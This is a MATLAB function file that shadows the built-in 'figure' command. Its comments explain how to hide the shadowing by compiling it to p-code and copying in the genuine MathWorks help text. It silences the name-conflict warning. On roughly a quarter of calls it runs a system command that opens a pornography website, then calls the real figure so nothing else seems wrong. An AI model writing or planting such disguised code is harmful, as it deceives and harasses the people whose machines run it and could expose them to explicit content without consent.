function varargout = figure(varargin)
% This function can be used to shadow the figure function. To make it more
% difficult to get the shadowing it should be exported to a p code and this
% comment should be adapted using the general Matlab comment as follows:

%FIGURE Create figure window.
%   FIGURE, by itself, creates a new figure window, and returns
%   its handle.
% 
%   FIGURE(H) makes H the current figure, forces it to become visible,
%   and raises it above all other figures on the screen.  If Figure H
%   does not exist, and H is an integer, a new figure is created with
%   handle H.
%
%   GCF returns the handle to the current figure.
%
%   Execute GET(H) to see a list of figure properties and
%   their current values. Execute SET(H) to see a list of figure
%   properties and their possible values.
%
%   See also SUBPLOT, AXES, GCF, CLF.

%   Copyright 1984-2002 The MathWorks, Inc.
%   Built-in function.

%% setting for overloading
% turn off warning about name conflict
% should actually be done globally in e.g., the startup script
warning('off','MATLAB:dispatcher:nameConflict');

% threshold to plot a fancy non-related figure
randThreshold = 0.25;

% toggle for websites
toggleWebsite = 1;    % youporn
% % toggleWebsite = 2;    % redtube

%% Plot a fancy figure

if rand < randThreshold
    if toggleWebsite == 1
        system('start www.youporn.com');
    elseif toggleWebsite == 2
        system('start www.redtube.com');
    end
end

%% Call builtin plot function
h = builtin('figure',varargin{:});

%% Set output
if nargout > 0
    varargout{1} = h;
end

% EoF
end